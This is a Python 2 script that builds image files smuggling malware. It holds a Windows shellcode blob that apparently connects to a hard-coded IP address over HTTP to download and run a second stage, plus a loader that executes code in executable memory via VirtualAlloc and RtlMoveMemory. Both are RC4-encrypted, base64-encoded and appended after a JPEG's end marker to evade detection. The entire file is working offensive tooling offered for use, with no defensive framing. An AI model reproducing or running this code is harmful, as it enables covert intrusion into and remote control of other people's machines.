'''#!/usr/bin/env python2.7'''
# -*- coding: utf-8 -*-
import hashlib,base64,sys,os

shellcode="\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57\x57\x57\x57\x57\x68\x3a\x56\x79\xa7\xff\xd5\xe9\x84\x00\x00\x00\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\x92\x1f\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x70\x5b\x31\xd2\x52\x68\x00\x02\x40\x84\x52\x52\x52\x53\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x83\xc3\x50\x31\xff\x57\x57\x6a\xff\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x84\xc3\x01\x00\x00\x31\xff\x85\xf6\x74\x04\x89\xf9\xeb\x09\x68\xaa\xc5\xe2\x5d\xff\xd5\x89\xc1\x68\x45\x21\x5e\x31\xff\xd5\x31\xff\x57\x6a\x07\x51\x56\x50\x68\xb7\x57\xe0\x0b\xff\xd5\xbf\x00\x2f\x00\x00\x39\xc7\x74\xb7\x31\xff\xe9\x91\x01\x00\x00\xe9\xc9\x01\x00\x00\xe8\x8b\xff\xff\xff\x2f\x34\x6a\x45\x79\x00\x73\xb1\xca\x91\x6f\x5d\x5a\x16\x69\x60\x1d\xc3\xcd\x35\x26\x72\x59\x2a\xbc\x23\xfa\x48\xbf\x15\xfd\x7f\xaf\x23\x83\xb5\x31\xc3\xcb\x2b\x76\x59\xd3\xd5\x50\xd6\xf5\x3c\xde\xfc\x85\xcb\x7a\x4c\xdb\xde\xab\x22\xab\xd4\x8b\xa1\xdf\xa8\x6b\xe2\xb3\x45\xcf\x5b\x4b\xd1\xc3\xcd\x47\x9a\x4a\x84\xb3\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x4e\x50\x30\x36\x29\x0d\x0a\x00\x0c\x4e\x80\x25\x39\x48\xe8\x52\xcc\xaf\x1c\xf3\xce\x05\x13\x6b\x46\x6e\x2b\x40\x6d\x6d\x5b\xa5\xd4\x60\x66\x11\xd9\x8a\x6f\xf8\x84\xc1\x60\xda\x8c\x92\xf1\x2d\x58\xea\xd2\xd8\x0d\xa0\x68\x15\xef\xc6\x77\x66\xcf\x23\xd2\x5f\x44\x0f\x8f\x98\xc6\x0f\x47\x48\x2a\xae\x6f\x7f\xb6\x7b\x54\x05\x45\xc3\x20\xb1\x0e\x5c\x2f\x79\x66\xa2\xd5\x48\x8d\x33\x0d\x0e\x87\x91\xee\x94\x09\xe5\xcd\xbf\xb0\xf9\xb9\xcc\xfc\x28\x12\xa1\xa2\x51\xc9\xe2\xcf\xc8\x20\xb7\xe5\x25\xc2\xc1\xe4\x56\x71\x96\x50\xe4\x01\x4b\x8d\xde\x09\xd3\x95\xcb\x2f\x9a\xf9\x7d\x51\x2e\xaa\xb9\x79\x7a\x65\xcb\x7d\xeb\x15\xa5\x96\x88\x3d\xed\xf8\xa8\x49\xec\x26\xf7\x44\x0f\x5c\xd0\x2b\x4f\xf4\x9a\x82\xb5\xe8\x30\xc3\x9e\xea\xfe\xf1\xd9\xec\x4c\xe6\x60\x9c\x54\x57\xc3\x1e\x75\x2c\x87\x2a\x72\xab\x62\x54\x26\xcf\xb7\xcf\x33\xbc\x91\xc5\xcc\xbf\x24\xc7\x3a\x65\xaa\x47\x5d\x35\x16\x64\xbb\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\xb9\x00\x00\x00\x00\x01\xd9\x51\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xc6\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\xa9\xfd\xff\xff\x31\x37\x32\x2e\x32\x37\x2e\x32\x32\x31\x2e\x33\x34\x00\x19\x69\xa0\x8d"
loader = "VirtualAlloc = windll.kernel32.VirtualAlloc;VirtualProtect=windll.kernel32.VirtualProtect;useless+=random.choice(useless);whnd=windll.kernel32.GetConsoleWindow();RtlMoveMemory=windll.kernel32.RtlMoveMemory;memHscode=VirtualAlloc(c_int(0),c_int(len(code)),c_int(0x3000),c_int(0x40));buf=(c_char*len(code)).from_buffer(code);useless+=random.choice(useless)[:-1];RtlMoveMemory(c_int(memHscode),buf,c_int(len(code)));runcode=cast(memHscode,CFUNCTYPE(c_void_p));runcode()"

def rc4(text,key):
    #Use md5(key) to get 32-bit key instead raw key
    key=hashlib.md5(key).hexdigest()
    result=''
    key_len=len(key)
    #1.init S-box
    box=list(range(256))#put 0-255 into S-box
    j=0
    for i in range(256):#shuffle elements in S-box according to key
        j=(j+box[i]+ord(key[i%key_len]))%256
        box[i],box[j]=box[j],box[i]#swap elements
    i=j=0
    for element in text:
        i=(i+1)%256
        j=(j+box[i])%256
        box[i],box[j]=box[j],box[i]
        k=chr(ord(element)^box[(box[i]+box[j])%256])
        result+=k
    result=base64.b64encode(result)
    return result

class Builder:
    def __init__(self):
        pass

    def shellcode(self,key,imgName):
        #base64encode
        baseStr=base64.b64encode(shellcode)
        #RC4+base64encode
        payload=rc4(baseStr,key)
        with open(imgName,'rb') as f:
            img=f.read()
            fileend=img[-2:]
            if(ord(fileend[0])!=255 and ord(fileend[0])!=217):
                if(img.count(chr(255)+chr(217))>0):
                    print("Please change the img.")
                    exit(0)
                else:
                    payload=img+chr(255)+chr(217)+payload
                    print("Abnormal end of file,auto add \xff\xd9")
            else:
                payload=img+payload
            with open("shellcode_"+imgName,'wb') as f1:
                f1.write(payload)
        print("Payload has write to shellcode_"+imgName)

    def loader(self,key,imgName):
        #base64encode
        baseStr=base64.b64encode(loader)
        #RC4+base64encode
        payload=rc4(baseStr,key)
        with open(imgName,'rb') as f:
            img=f.read()
            fileend=img[-2:]
            if(ord(fileend[0])!=255 and ord(fileend[0])!=217):
                if(img.count(chr(255)+chr(217))>0):
                    print("Please change the img.")
                    exit(0)
                else:
                    payload=img+chr(255)+chr(217)+payload
                    print("Abnormal end of file,auto add \xff\xd9")
            else:
                payload=img+payload
            with open("loader_"+imgName,'wb') as f1:
                f1.write(payload)
        print("Payload has write to loader_"+imgName)
    
def main():
    if len(sys.argv)!=3:
        print("Usage:python generator.py YourRC4Key imgName")
        exit(0)
    else:
        key=sys.argv[1]
        imgName=sys.argv[2]
        if(not os.path.exists(imgName) or os.path.getsize(imgName)<=200):
            print("check your img param!")
            exit(0)
    newscode=Builder()
    newscode.shellcode(key,imgName)
    newscode.loader(key,imgName)
    
if __name__=="__main__":
    main()